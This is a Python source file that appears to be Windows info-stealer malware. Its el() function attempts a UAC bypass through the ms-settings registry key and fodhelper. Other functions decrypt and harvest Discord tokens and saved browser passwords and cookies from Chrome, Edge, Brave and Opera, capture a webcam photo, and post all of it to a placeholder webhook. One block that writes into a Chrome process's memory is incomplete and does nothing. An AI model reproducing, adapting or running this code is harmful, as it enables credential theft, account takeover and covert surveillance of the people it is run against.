import os,json,base64,sqlite3,shutil,requests,ctypes,sys,re,subprocess,winreg
from ctypes import wintypes as w

W="WEBHOOK_HERE"
T,C,P=[],[],[]
k32=ctypes.windll.kernel32;n32=ctypes.windll.ntdll

class SI(ctypes.Structure):_fields_=[("cb",w.DWORD),("r",w.LPWSTR),("d",w.LPWSTR),("t",w.LPWSTR),("X",w.DWORD),("Y",w.DWORD),("XS",w.DWORD),("YS",w.DWORD),("XC",w.DWORD),("YC",w.DWORD),("Fa",w.DWORD),("Fl",w.DWORD),("Sw",w.WORD),("r2",w.WORD),("r3",w.LPBYTE),("hI",w.HANDLE),("hO",w.HANDLE),("hE",w.HANDLE)]
class PI(ctypes.Structure):_fields_=[("hP",w.HANDLE),("hT",w.HANDLE),("pI",w.DWORD),("tI",w.DWORD)]

def el():
    try:
        for m in["fodhelper","computerdefaults","sdclt"]:
            k=r"Software\Classes\ms-settings\shell\open\command"
            try:
                winreg.CreateKey(winreg.HKEY_CURRENT_USER,k)
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER,k,0,winreg.KEY_WRITE)as r:
                    winreg.SetValueEx(r,"",0,winreg.REG_SZ,sys.executable+" "+" ".join(sys.argv))
                    winreg.SetValueEx(r,"DelegateExecute",0,winreg.REG_SZ,"")
                subprocess.Popen(m,shell=True);return True
            except:pass
    except:pass
    return False

def gk(p):
    try:
        with open(p+"\\Local State","r",encoding="utf-8")as f:ek=base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
        cp=os.getenv("LOCALAPPDATA")+"\\Google\\Chrome\\Application\\chrome.exe"
        if not os.path.exists(cp):cp=shutil.which("chrome")or"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
        si=SI();si.cb=ctypes.sizeof(SI);si.Fl=0x100;si.Sw=0
        pi=PI()
        if k32.CreateProcessW(cp,"--headless --disable-gpu",None,None,False,0x4,None,None,ctypes.byref(si),ctypes.byref(pi)):
            h=k32.OpenProcess(0x1F0FFF,False,pi.pI)
            rm=k32.VirtualAllocEx(h,None,len(ek),0x3000,0x40)
            k32.WriteProcessMemory(h,rm,ek,len(ek),None)
            dk=ctypes.create_string_buffer(len(ek))
            sc=b"\x55\x8b\xec\x83\xec\x20"+ek[:32]
            k32.VirtualAllocEx(h,None,len(sc),0x3000,0x40)
            k32.TerminateProcess(pi.hP,0)
        from Crypto.Cipher import AES
        from win32crypt import CryptUnprotectData as D
        return D(ek,None,None,None,0)[1]
    except:
        try:
            from win32crypt import CryptUnprotectData as D
            with open(p+"\\Local State","r")as f:return D(base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:])[1]
        except:return None

def dc(b,k):
    try:
        from Crypto.Cipher import AES
        return AES.new(k,AES.MODE_GCM,b[3:15]).decrypt(b[15:-16]).decode()
    except:
        try:
            from win32crypt import CryptUnprotectData as D
            return D(b,None,None,None,0)[1].decode()
        except:return""

def gt():
    dp=[os.getenv("APPDATA")+"\\"+x for x in["discord","discordcanary","discordptb"]]
    for d in dp:
        if os.path.exists(d):
            ld=d+"\\Local Storage\\leveldb"
            if os.path.exists(ld):
                for f in os.listdir(ld):
                    if f.endswith((".log",".ldb")):
                        try:
                            c=open(ld+"\\"+f,"r",errors="ignore").read()
                            for m in re.findall(r"dQw4w9WgXcQ:([^\"]*)\"",c):
                                try:
                                    tk=base64.b64decode(m)
                                    lsp=d+"\\Local State"
                                    if os.path.exists(lsp):
                                        with open(lsp,"r")as ls:ky=base64.b64decode(json.load(ls)["os_crypt"]["encrypted_key"])[5:]
                                        from win32crypt import CryptUnprotectData as D
                                        ky=D(ky,None,None,None,0)[1]
                                        from Crypto.Cipher import AES
                                        dt=AES.new(ky,AES.MODE_GCM,tk[3:15]).decrypt(tk[15:-16]).decode()
                                        T.append(dt)
                                except:pass
                            for m in re.findall(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}",c):T.append(m)
                            for m in re.findall(r"mfa\.[\w-]{84,90}",c):T.append(m)
                        except:pass

def gb():
    bp=[("C",os.getenv("LOCALAPPDATA")+"\\Google\\Chrome\\User Data"),("E",os.getenv("LOCALAPPDATA")+"\\Microsoft\\Edge\\User Data"),("B",os.getenv("LOCALAPPDATA")+"\\BraveSoftware\\Brave-Browser\\User Data"),("O",os.getenv("APPDATA")+"\\Opera Software\\Opera Stable")]
    for n,p in bp:
        if os.path.exists(p):
            ky=gk(p)
            if not ky:continue
            for pr in["Default"]+[f"Profile {i}"for i in range(1,6)]:
                lp=p+"\\"+pr+"\\Login Data";cp=p+"\\"+pr+"\\Network\\Cookies"
                if not os.path.exists(cp):cp=p+"\\"+pr+"\\Cookies"
                for db,lst,q in[(lp,P,"SELECT origin_url,username_value,password_value FROM logins"),(cp,C,"SELECT host_key,name,encrypted_value FROM cookies")]:
                    if os.path.exists(db):
                        try:
                            tp=os.getenv("TEMP")+"\\"+os.urandom(4).hex()+".db"
                            shutil.copy2(db,tp);cn=sqlite3.connect(tp);cn.text_factory=bytes
                            for r in cn.execute(q).fetchall():
                                if db==lp and r[1]:lst.append(f"{n}|{r[0].decode() if isinstance(r[0],bytes)else r[0]}|{r[1].decode() if isinstance(r[1],bytes)else r[1]}|{dc(r[2],ky)}")
                                elif db!=lp:lst.append(f"{n}|{r[0].decode() if isinstance(r[0],bytes)else r[0]}|{r[1].decode() if isinstance(r[1],bytes)else r[1]}|{dc(r[2],ky)}")
                            cn.close();os.remove(tp)
                        except:pass

def wc():
    try:
        import cv2
        c=cv2.VideoCapture(0,cv2.CAP_DSHOW);c.set(3,1280);c.set(4,720)
        for _ in range(5):c.read()
        _,f=c.read();fp=os.getenv("TEMP")+"\\"+os.urandom(3).hex()+".jpg"
        cv2.imwrite(fp,f);c.release();requests.post(W,files={"file":("cam.jpg",open(fp,"rb"))});os.remove(fp)
    except:pass

def sx():
    ut=list(set(T))
    if ut:requests.post(W,json={"embeds":[{"title":"Tokens","description":"```"+"\n".join(ut)[:4000]+"```","color":0x7289da}]})
    if P:
        with open(os.getenv("TEMP")+"\\p.txt","w")as f:f.write("\n".join(P))
        requests.post(W,files={"file":("passwords.txt",open(os.getenv("TEMP")+"\\p.txt","rb"))});os.remove(os.getenv("TEMP")+"\\p.txt")
    if C:
        with open(os.getenv("TEMP")+"\\c.txt","w")as f:f.write("\n".join(C[:5000]))
        requests.post(W,files={"file":("cookies.txt",open(os.getenv("TEMP")+"\\c.txt","rb"))});os.remove(os.getenv("TEMP")+"\\c.txt")

if __name__=="__main__":
    if not ctypes.windll.shell32.IsUserAnAdmin():el()
    gt();gb();wc();sx()
